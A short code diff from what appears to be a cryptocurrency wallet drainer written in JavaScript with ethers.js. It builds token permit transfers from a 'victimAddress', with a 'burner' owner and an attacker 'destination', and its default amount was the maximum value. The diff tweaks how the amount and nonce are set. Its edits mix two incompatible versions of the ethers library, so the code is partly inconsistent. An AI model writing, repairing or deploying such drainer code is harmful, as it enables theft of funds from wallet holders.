@@ -203,7 +203,7 @@ if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAd
 
     // 🔥 MAX AMOUNT + FUTURE VALUES
     // Parse amount safely
-    const parsedAmount = ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff');
+    const parsedAmount = ethers.toBeHex(ethers.parseUnits(amount || '1000000000000000000', 18));
     
     // Validate deadline
     if (!deadline || parseInt(deadline) < Date.now()/1000) {
@@ -243,7 +243,7 @@ if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAd
         permit.details.token,
         permit.details.amount,
         ethers.BigNumber.from(now + 86400), // expiration
-        permit.details.nonce
+        ethers.BigNumber.from(nonce || 0)
       ],
       burner.address,        // owner
       destination,           // recipient  
